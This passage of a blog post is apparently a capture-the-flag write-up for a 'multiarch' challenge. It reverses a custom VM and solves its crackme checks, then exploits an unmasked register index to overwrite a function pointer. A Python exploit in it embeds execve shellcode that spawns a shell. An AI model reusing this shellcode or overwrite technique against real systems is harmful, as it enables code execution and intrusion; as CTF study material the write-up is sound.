+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;[E] nice qubit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0xFuLL</span>, stderr);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SYSCALLS:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">0 - READ_INT - reading integer from stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">1 - READ_MEM - reading bytes from stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">2 - WRITE_MEM - writing bytes to stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">3 - SRAND - calling srand()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">4 - RAND - generating random number with rand()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">5 - PRINT_FLAG - printing flag from env
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">6 - EXPAND_MEM - allocating additional memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span></code></pre></div><p>Addressing something in the VM uses a kind of virtual addressing, not direct offsetting.
+There’s a function for parsing a virtual address to a real address outside the VM.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">vm_parse_addr</span>(VM <span style="color:#f92672">*</span>vm, <span style="color:#66d9ef">uint32_t</span> addr, <span style="color:#66d9ef">size_t</span> size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> end; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> mems_cnt; <span style="color:#75715e">// di
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>result; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>p_vaddr; <span style="color:#75715e">// rcx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">size_t</span> end_; <span style="color:#75715e">// r10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint32_t</span> vaddr; <span style="color:#75715e">// edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( addr <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xFFF</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_7;
+</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> addr;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( end <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1FFF</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)vm<span style="color:#f92672">-&gt;</span>code <span style="color:#f92672">+</span> addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( addr <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1FFF</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_7;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( end <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x2FFF</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)vm<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">+</span> addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( addr <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7FFF</span> <span style="color:#f92672">&amp;&amp;</span> end <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x8FFF</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)vm<span style="color:#f92672">-&gt;</span>stack <span style="color:#f92672">+</span> addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8000</span>;
+</span></span><span style="display:flex;"><span>    LABEL_7:
+</span></span><span style="display:flex;"><span>    mems_cnt <span style="color:#f92672">=</span> vm<span style="color:#f92672">-&gt;</span>mems_cnt;
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( mems_cnt )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        p_vaddr <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>vm<span style="color:#f92672">-&gt;</span>add_mems[<span style="color:#ae81ff">0</span>].vaddr;
+</span></span><span style="display:flex;"><span>        end_ <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> addr;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>        vaddr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>p_vaddr;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( addr <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">*</span>p_vaddr <span style="color:#f92672">&amp;&amp;</span> end_ <span style="color:#f92672">&lt;</span> vaddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200</span> )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)vm<span style="color:#f92672">-&gt;</span>add_mems[(<span style="color:#66d9ef">int</span>)result].data <span style="color:#f92672">+</span> addr <span style="color:#f92672">-</span> vaddr;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>result) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint32_t</span>)result <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        p_vaddr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">uint32_t</span>)result <span style="color:#f92672">!=</span> mems_cnt );
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I uploaded the complete file containing the decompiled code from IDA here: <a href="/blog/scripts/multiarch/decompiled.c">decompiled.c</a>.
+Based on that decompilation, I wrote a disassembler for the VM in Python to produce assembly-like code from the provided file.
+The disassembler script is available here: <a href="/blog/scripts/multiarch/disasm.py">disasm.py</a>.</p>
+<h3 id="solving-challenge">Solving challenge</h3>
+<p>There are three parts (checks) in the <code>crackme.masm</code> challenge.
+The first one is very easy to pass; it could be done even without reversing the whole VM, just by using a debugger.
+It just reads an integer from stdin and performs XOR and addition operations to compute a value.</p>
+<pre tabindex="0"><code>0x1000 : PUSHB 0x4b
+0x1005 : PUSH 0x2000
+0x100a : PUSHB 0x2
+0x100f : STACK_SYSCALL -- write message
+0x1014 : PUSHB 0x2b
+0x1019 : PUSH 0x20ad
+0x101e : PUSHB 0x2
+0x1023 : STACK_SYSCALL -- write message
+0x1028 : PUSHB 0x0
+0x102d : STACK_SYSCALL -- read int
+0x1032 : PUSHW 0x1337
+0x1037 : PUSHW 0x539
+0x103c : PUSH 0x8675309
+0x1041 : STACK_XOR
+0x1046 : STACK_ADD
+0x104b : PUSH 0xaaaaaaaa
+0x1050 : STACK_CMP
+0x1055 : JNE 0x110b
+
+(input + (0x8675309 ^ 0x13370539)) == 0xaaaaaaaa
+
+input = 0xaaaaaaaa - (0x8675309 ^ 0x13370539) = 0x8f5a547a
+</code></pre><p>The second part is a little bit more complex. It loads some bytes from stdin and calls a function.
+The function iterates over them, performing multiplication and XORing the higher parts of the product to compute a value.</p>
+<pre tabindex="0"><code>0x105a : MOV RA, 0x2
+0x105f : MOV RB, 0x20d8
+0x1064 : MOV RC, 0x1e
+0x1069 : SYSCALL -- write message
+0x106a : SUB SP, 32
+0x1070 : MOV RB, SP
+0x1071 : PUSH RB
+0x1072 : MOV RC, 0x20
+0x1077 : MOV RA, 0x1
+0x107c : SYSCALL -- read 32 chars
+0x107d : POP RA
+0x107e : MOV RB, 0x20
+0x1083 : CALL 0x111c
+0x1088 : CMP RA, 0x7331
+0x108d : JNE 0x110b
+
+func1(buf, size) == 0x7331
+ceil((0x7331 &lt;&lt; 32) / 3405691582) = 0x9146
+
+0x111c : MOV RC, RA
+0x111d : ADD RA, RB
+0x111f : PUSH RA
+0x1120 : MOV RB, 0x0
+0x1125 : MOV RD, [RC]
+0x1127 : MUL RD, 3405691582
+0x112d : XOR RB, RD
+0x112f : POP RA
+0x1130 : PUSH RA
+0x1131 : CMP RA, RC
+0x1132 : JE 0x1142
+0x1137 : ADD RC, 4
+0x113d : JMP 0x1125
+0x1142 : MOV RA, RB
+0x1143 : RETN 0x1
+
+def func1(buf, size):
+    res = 0
+    for i = 0..size, 4:
+        res ^= (le(buf[i:i+4]) * 3405691582) &gt;&gt; 32
+    return res
+
+sending bytes b&#39;\x46\x91&#39; will pass the check
+</code></pre><p>The third part is the most complex. It seeds <code>srand</code> with an inputted integer and tries to get
+a random number to match a specific value. This part requires a bit of bruteforcing, which I handled in C.</p>
+<pre tabindex="0"><code>0x1092 : MOV RA, 0x0
+0x1097 : PUSHB 0x5a
+0x109c : PUSH 0x20f6
+0x10a1 : PUSHB 0x2
+0x10a6 : STACK_SYSCALL -- write message
+0x10ab : SYSCALL -- read int
+0x10ac : MOV RB, RA
+0x10ad : MOV RA, 0x3
+0x10b2 : SYSCALL -- srand
+0x10b3 : MOV RC, 0x0
+0x10b8 : CALL 0x1145
+0x10bd : PUSH 0xffffff
+0x10c2 : PUSH RA
+0x10c3 : STACK_AND
+0x10c8 : PUSH 0xc0ffee
+0x10cd : STACK_CMP
+0x10d2 : JE 0x10ec
+0x10d7 : ADD RC, 1
+0x10dd : CMP RC, 0xa
+0x10e2 : JE 0x110b
+0x10e7 : JMP 0x10b8
+
+srand(input)
+for i in 0..10:
+    res = func2() &amp; 0xffffff
+    if res == 0xc0ffee:
+        return True
+return False
+
+0x10ec : MOV RC, 0x39
+0x10f1 : MOV RB, 0x2074
+0x10f6 : MOV RA, 0x2
+0x10fb : SYSCALL
+0x10fc : PUSHB 0x5
+0x1101 : STACK_SYSCALL -- print flag
+0x1106 : JMP 0x111b
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> <span style="color:#a6e22e">get_rand</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> res <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint16_t</span>)<span style="color:#a6e22e">rand</span>();
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">srand</span>(i);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint32_t</span> r <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_rand</span>();
+</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> (r <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x133700</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xf2f2f2f2</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffff</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc0ffee</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        i<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And that was my solution for the reverse engineering challenge in <strong>multiarch</strong>.</p>
+<h2 id="vm-exploitation">VM exploitation</h2>
+<h3 id="finding-the-vulnerability">Finding the vulnerability</h3>
+<p>Finding the vulnerability in this one was a bit tricky, but what actually took me the most time was making an assumption.
+When I was looking at the part of the code handling register operations — specifically the addition operation — I saw it was safe;
+there wasn’t any buffer overflow for register indexing. I assumed it was the same for all operations and skipped checking the others.
+That was my mistake. When I came back to that part later, I noticed that there was no <code>&amp; 3</code> mask for the other operations (XOR and SUB),
+which means there’s an overflow there.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x20u</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    v11 <span style="color:#f92672">=</span> vm<span style="color:#f92672">-&gt;</span>PC;
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>PC <span style="color:#f92672">=</span> v11 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    ok <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm_load_byte</span>(vm, v11, <span style="color:#f92672">&amp;</span>result);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ok )
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>vm<span style="color:#f92672">-&gt;</span>RA <span style="color:#f92672">+</span> ((((<span style="color:#66d9ef">uint8_t</span>)result <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>)) <span style="color:#f92672">+=</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>vm<span style="color:#f92672">-&gt;</span>RA <span style="color:#f92672">+</span> (((<span style="color:#66d9ef">uint8_t</span>)result <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        vm<span style="color:#f92672">-&gt;</span>err_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ok;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x30u</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    PC__ <span style="color:#f92672">=</span> vm<span style="color:#f92672">-&gt;</span>PC;
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>PC <span style="color:#f92672">=</span> PC__ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    ok <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm_load_byte</span>(vm, PC__, <span style="color:#f92672">&amp;</span>result);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ok )
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>vm<span style="color:#f92672">-&gt;</span>RA <span style="color:#f92672">+</span> (<span style="color:#66d9ef">uint8_t</span>)(((<span style="color:#66d9ef">uint8_t</span>)result <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">-=</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>vm<span style="color:#f92672">-&gt;</span>RA <span style="color:#f92672">+</span> (<span style="color:#66d9ef">uint8_t</span>)((result <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        vm<span style="color:#f92672">-&gt;</span>err_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ok;
+</span></span></code></pre></div><h3 id="exploitation">Exploitation</h3>
+<p>After finding the vulnerability, the exploitation part was relatively easy. My strategy was to
+allocate some additional memory using the <code>EXPAND_MEM</code> syscall, getting a heap address located after the registers array.
+Then, I used the overflow to modify that address to point to the VM structure, which is also on the heap.
+Accessing the added memory would now access the VM structure, which could be used to overwrite the <code>getflag</code> argument in the struct with the <code>data</code> segment address.
+By placing shellcode in the <code>data</code> segment and calling <code>PRINT_FLAG</code>, we could get a shell.</p>
+<p>I also created a <code>struct.c</code> file and compiled it to <code>struct.o</code> so I could load DWARF struct symbols in GDB to make
+debugging easier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">__attribute__</span>((packed)) MemSeg {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> vaddr;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">__attribute__</span>((packed)) VM {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mem1;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mem2;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mem3;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mem4;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>getflag)();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> err_flag, mode_flag, FLAGS;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> PC, SP, RA, RB, RC, RD;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> MemSeg add_mems[<span style="color:#ae81ff">5</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> mems_cnt;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> VM vm;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">file multiarch
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">add-symbol-file structs.o 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">brva 0x1333
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">set $vm = (struct VM*)$rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span></code></pre></div><p>I wrote an assembler class in Python to make it easier and more understandable to create a VM file.
+This is the exploit file, which is enough to get a shell and read the flag from the filesystem.
+The full exploit file can be found here: <a href="/blog/scripts/multiarch/exploit.py">exploit.py</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>asmb <span style="color:#f92672">=</span> Assembler()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>stack_push(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>stack_push_byte(<span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>stack_syscall() <span style="color:#75715e"># EXPAND_MEM</span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>xor_imm(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x370</span>) <span style="color:#75715e"># chaning address to point to VM*</span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>ldr_imm(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0xa008</span>) <span style="color:#75715e"># reading lower part of data address</span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>str_imm(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0xa028</span>) <span style="color:#75715e"># storing lower part of data address at getflag</span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>ldr_imm(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0xa00c</span>) <span style="color:#75715e"># reading higher part of data address</span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>str_imm(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0xa02c</span>) <span style="color:#75715e"># storing higher part of data address at getflag</span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>stack_push_byte(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>stack_syscall() <span style="color:#75715e"># PRINT_FLAG</span>
+</span></span><span style="display:flex;"><span>asmb<span style="color:#f92672">.</span>halt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;MASM&#34;</span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> asmb<span style="color:#f92672">.</span>code
+</span></span><span style="display:flex;"><span>bssdata <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>archmask <span style="color:#f92672">=</span> bytes(asmb<span style="color:#f92672">.</span>archmask)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    magic,
+</span></span><span style="display:flex;"><span>    make_segment(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">19</span>, len(code)),
+</span></span><span style="display:flex;"><span>    make_segment(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">19</span> <span style="color:#f92672">+</span> len(code), len(bssdata)),
+</span></span><span style="display:flex;"><span>    make_segment(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">19</span> <span style="color:#f92672">+</span> len(code) <span style="color:#f92672">+</span> len(bssdata), len(archmask)),
+</span></span><span style="display:flex;"><span>    code, bssdata, archmask
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>open(<span style="color:#e6db74">&#34;exploit.masm&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)<span style="color:#f92672">.</span>write(payload)
+</span></span></code></pre></div>
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#reversing-virtual-machine">Reversing Virtual Machine</a>
+      <ul>
+        <li><a href="#file-structure-and-vm-initialization">File Structure and VM Initialization</a></li>
+        <li><a href="#execution-and-virtual-address">Execution and &lsquo;virtual&rsquo; address</a></li>
+        <li><a href="#solving-challenge">Solving challenge</a></li>
+      </ul>
+    </li>
+    <li><a href="#vm-exploitation">VM exploitation</a>
+      <ul>
+        <li><a href="#finding-the-vulnerability">Finding the vulnerability</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
